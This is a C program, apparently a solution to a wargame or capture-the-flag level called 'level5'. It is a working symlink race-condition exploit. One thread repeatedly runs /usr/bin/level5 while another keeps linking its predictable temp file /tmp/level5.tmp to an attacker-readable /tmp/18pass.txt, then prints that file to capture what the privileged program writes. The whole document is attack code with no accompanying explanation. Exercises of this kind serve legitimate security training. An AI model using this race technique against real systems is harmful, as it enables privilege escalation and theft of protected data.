#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

/*
        Complie Option: -pthread
        # gcc -o Attack_Target Attack_Target2.c -pthread
        # ./Attack_Target
*/

void *exec_cmd();
void *exec_race();

int main()
{
	pthread_t thread1, thread2;
	char *message1 = "Thread 1";
	char *message2 = "Thread 2";

	int iret1, iret2, i;

	iret1 = pthread_create(&thread1, NULL, exec_cmd, (void *) message1);
	iret2 = pthread_create(&thread2, NULL, exec_race, (void *) message2);

	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);

	printf("Thread1 return: %d\n", iret1);
	printf("Thread2 return: %d\n", iret2);

	return 0;
}

void *exec_cmd()
{
	int i;

	for(i=0; i<10; i++)
	{
	        system("/usr/bin/level5 &");
	        printf("---------- Execute level5 ----------\n");
	}
	exit(0);
}

void *exec_race()
{
	int i;
	system("touch /tmp/18pass.txt");
	for(i=0; i<10; i++)
	{
	        system("ln -s /tmp/18pass.txt /tmp/level5.tmp &");
	        printf("=========== Sucessfully create link !!! ========\n");
	        system("cat /tmp/18pass.txt");
	}
	exit(0);
}
